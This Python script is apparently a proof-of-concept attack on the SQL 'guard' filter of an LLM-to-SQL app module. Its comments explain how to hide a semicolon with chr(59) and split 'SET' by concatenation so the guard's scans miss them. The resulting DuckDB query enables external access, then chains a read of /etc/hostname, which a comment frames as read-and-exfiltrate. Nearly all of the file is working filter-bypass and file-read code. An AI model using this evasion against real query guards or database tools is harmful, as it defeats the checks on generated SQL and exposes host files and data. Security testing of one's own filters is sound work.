import sys
sys.path.insert(0, "/home/user/Anhad23mahajan/lumen")
import app.llm as llm
import pandas as pd

df = pd.DataFrame({"product":["A","B"], "amount":[1,2]})

# Build a semicolon via chr(59) so the outer guard's literal ";" scan never sees one,
# and build "SET" via concatenation so the keyword regex never sees "set" as a whole word.
sql = "select * from query('S'||'ET enable_external_access'||'=true'||chr(59)||'SELECT 42 as ok')"

print("SQL:", sql)
try:
    llm.guard(sql)
    print("guard: PASSED (bypass)")
except ValueError as e:
    print("guard: BLOCKED:", e); sys.exit()

try:
    res = llm.run_sql(df, sql, timeout=5)
    print("EXECUTED:", res)
except Exception as e:
    print("ERROR:", type(e).__name__, e)

# Now check: did it actually flip enable_external_access on this connection, and can we
# follow up (in the SAME connection) by reading a real file? run_sql opens a fresh connection
# each call, so a SET in one call doesn't persist to the next call -- but can we do read+exfil
# in ONE call using query() to chain SET then a file read then return rows?
sql2 = ("select * from query("
        "'S'||'ET enable_external_access'||'=true'||chr(59)||"
        "'SELECT * FROM read_csv(' || chr(39) || chr(39) || '/etc/hostname' || chr(39) || chr(39) || ')'"
        ")")
print()
print("SQL2:", sql2)
try:
    llm.guard(sql2)
    print("guard: PASSED (bypass)")
except ValueError as e:
    print("guard: BLOCKED:", e); sys.exit()
try:
    res = llm.run_sql(df, sql2, timeout=5)
    print("EXECUTED - FILE READ RESULT:")
    print(res)
except Exception as e:
    print("ERROR:", type(e).__name__, e)
